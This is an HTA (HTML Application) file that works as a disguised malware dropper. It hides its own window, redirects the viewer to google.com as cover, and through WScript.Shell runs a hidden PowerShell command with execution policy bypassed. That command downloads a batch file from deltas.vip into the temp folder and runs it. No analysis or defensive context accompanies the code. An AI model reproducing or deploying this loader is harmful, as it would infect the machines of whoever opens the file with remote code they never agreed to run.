<html>
<head>
<HTA:APPLICATION
    border="none"
    caption="no"
    showintaskbar="no"
    windowstate="minimize"
    contextMenu="no"
    selection="no"
    maximizeButton="no"
    minimizeButton="no"
    sysMenu="no"
    scroll="no"
    scrollFlat="no"
    singleInstance="yes">

<meta http-equiv="refresh" content="0;url=https://google.com">

<script language="jscript">
    self.resizeTo(0, 0);
    self.moveTo(-10000, -10000);
    document.title = "";
    window.focus();
    document.body.style.display = "none";

    var a = "http://deltas.vip/guapo.bat";
    var b = "curl.bat";

    var cmd2 = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "';
    cmd2 += '$wc=New-Object Net.WebClient;';
    cmd2 += '$wc.DownloadFile('' + a + '',"$env:TEMP\' + b + '");';
    cmd2 += 'Start-Process -FilePath "$env:TEMP\' + b + '" -WindowStyle Hidden -NoNewWindow"';

    new ActiveXObject("WScript.Shell").Run(cmd2, 0, false);
</script>

</head>
<body>
<script>
    self.close();
</script>
</body>
</html>
